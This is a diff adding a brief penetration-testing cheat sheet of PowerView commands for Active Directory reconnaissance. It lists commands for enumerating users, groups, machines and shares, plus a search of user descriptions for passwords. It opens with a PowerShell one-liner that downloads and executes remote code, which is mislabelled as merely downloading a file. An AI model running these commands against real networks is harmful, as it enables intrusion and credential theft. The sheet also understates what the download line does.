@@ -1,0 +1,21 @@
+iex (New-Object Net.WebClient).DownloadString('<url>') :To download a file
+
+Powerview Commands:
+
+Get-Netuser: To get information about the users in the domain environment
+
+find-userfield -SearchField description "password": To find passwords in description of the users in a domain environment
+
+Get-Netgroup: To get information about the groups in the domain environment
+ -UserName
+ -GroupName
+can be used to get group related information about specific user or group
+
+Get-NetComputer -FullData: To get information about the machines in the domain
+ -OperatingSystem "Windows 10"
+
+Invoke-ShareFinder: To enumerate shares in the domain environment
+ -ExcludeStandard
+ -ExcludePrint
+ -ExcludeIPC
+ 
